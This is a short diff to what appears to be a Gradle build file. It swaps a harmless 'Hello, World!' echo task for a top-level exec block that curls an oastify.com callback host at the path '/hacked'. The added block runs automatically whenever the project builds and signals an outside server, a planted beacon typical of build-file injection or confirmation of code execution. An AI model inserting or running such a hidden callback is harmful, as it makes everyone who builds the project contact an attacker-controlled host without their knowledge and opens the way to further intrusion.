@@ -1,8 +1,3 @@
-task runShellCommand(type: Exec) {
-    // Use the appropriate shell based on the operating system
-    if (System.getProperty('os.name').toLowerCase().contains('windows')) {
-        commandLine 'cmd', '/c', 'echo Hello, World!'
-    } else {
-        commandLine 'sh', '-c', 'echo "Hello, World!"'
-    }
+exec {
+    commandLine 'curl', '-X', 'GET', 'y65k661vr0xcyapqv3im4yi4rvxmle93.oastify.com/hacked'
 }
